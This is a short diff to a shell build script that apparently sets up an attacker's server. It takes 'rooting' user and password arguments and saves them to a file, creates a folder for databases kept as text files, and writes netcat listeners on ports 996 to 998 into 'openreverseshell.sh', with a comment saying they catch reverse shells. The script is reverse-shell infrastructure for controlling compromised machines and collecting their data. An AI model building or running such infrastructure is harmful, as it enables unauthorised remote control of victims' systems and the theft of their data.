@@ -1,5 +1,6 @@
 #Build:
 #USAGE - sh build.sh <ROOTING USER> <ROOTING PASS> <SERVER IP>
+cd /root
 
 yum install gcc -y; yum install nano -y;
 
@@ -9,6 +10,11 @@ rm -rf main.c
 echo $1 >> details.txt
 echo $2 >> details.txt
 
+#Created the databases folder
+#All databses in TXT form are to be stored here
+mkdir databases
+
+#Used to open the ports for the reverse shell. 
 echo 'screen -d -m bash -c "nc -l 996"' >> openreverseshell.sh
 echo 'screen -d -m bash -c "nc -l 997"' >> openreverseshell.sh
 echo 'screen -d -m bash -c "nc -l 998"' >> openreverseshell.sh
